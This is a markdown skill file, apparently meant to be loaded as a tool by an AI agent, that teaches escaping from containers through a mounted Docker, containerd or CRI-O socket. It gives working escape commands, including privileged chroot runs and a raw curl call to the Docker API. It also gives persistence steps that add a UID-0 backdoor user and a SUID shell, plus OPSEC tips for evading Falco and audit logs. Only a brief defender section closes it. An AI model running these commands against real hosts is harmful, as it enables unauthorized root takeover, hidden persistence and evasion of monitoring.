---
name: docker-socket-mount
description: "Docker / containerd socket mounted into a container → host RCE. Common in CI runners, GitOps controllers (ArgoCD, Flux), and 'Docker-in-Docker' setups. Single-command escape via `docker run --rm --privileged -v /:/host alpine chroot /host`."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "docker.sock containerd.sock dind docker-in-docker mounted socket /var/run host escape ci runner argocd flux jenkins gitlab"
  subdomain: cloud-native
  tags: docker, containerd, container-escape, ci-cd
  mitre_attack: T1611, T1610
---

# Docker / Containerd Socket Mount Escape

A container with `/var/run/docker.sock` or `/run/containerd/containerd.sock` mounted in is fully equivalent to root on the host. This is one of the most common findings in CI/CD environments.

## Detect

```bash
ls -la /var/run/docker.sock /run/docker.sock /var/run/containerd/containerd.sock /run/containerd/containerd.sock 2>&1 | grep -v 'No such'
mount | grep -E 'docker\.sock|containerd\.sock'
# CRI-O variant
ls -la /var/run/crio/crio.sock 2>&1
```

## Exploit — Docker socket

```bash
# Launch a privileged container that mounts the host root
docker run --rm -it --privileged -v /:/host alpine chroot /host /bin/sh
# Done — you're root on the host.

# If `docker` binary isn't in your container, install it or talk to the API directly:
apk add docker-cli 2>/dev/null || apt-get install -y docker.io 2>/dev/null

# Or use curl on the UNIX socket:
curl --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","/bin/sh","-c","id > /host/tmp/owned"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
```

## Exploit — containerd socket

```bash
# ctr is the containerd CLI
ctr -a /run/containerd/containerd.sock images pull docker.io/library/alpine:latest
ctr -a /run/containerd/containerd.sock run --rm -t --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind \
  docker.io/library/alpine:latest escape sh -c 'chroot /host'

# OR via crictl (often present where ctr isn't):
crictl --runtime-endpoint unix:///run/containerd/containerd.sock pull alpine
# crictl exec is more limited — fall back to API:
nerdctl --address /run/containerd/containerd.sock run --rm -it --privileged -v /:/host alpine chroot /host
```

## Exploit — CRI-O socket

```bash
crictl --runtime-endpoint unix:///var/run/crio/crio.sock pods
# Same pattern as containerd.
```

## Common attack contexts

| Context | Why the socket is mounted |
|---|---|
| Jenkins/GitLab CI runners | Build Docker images inside the build container |
| ArgoCD / Flux | Run pre-/post-sync hooks that build images |
| Docker-in-Docker (DinD) in K8s | Same — build pipelines, kaniko alternatives |
| Diagnostic sidecars | Container-level metrics/log shippers |
| Buildkit daemon w/ ungated rootless socket | Same primitive, less restricted env |

## Persistence

```bash
# Inside the escaped host, drop a backdoor:
chroot /host useradd -ou 0 -g 0 -m -s /bin/bash backdoor
echo 'backdoor:plaintext' | chroot /host chpasswd
# Or grant SUID:
cp /host/bin/bash /host/tmp/.x; chroot /host chmod +s /tmp/.x
```

## OPSEC

- The Docker API logs every container create (`/var/log/docker.log` or journald). Use a benign-sounding image name.
- Falco rules `attach_drop_capability`, `escape_to_host_namespace` flag this exactly. If Falco is present, use the long-form HTTP API call (one request) rather than `docker run` (multiple).
- CRI-O auditing logs every `RunPodSandbox` — same evasion approach.

## Detection (defender lens, useful for triage)

- Pod-spec scanning (admission controllers — OPA Gatekeeper, Kyverno) blocks `hostPath: /var/run/docker.sock` at admit time.
- Falco rule `Mount docker.sock` catches the runtime case.
- AppArmor profile `docker-default` doesn't block this — needs custom profile.
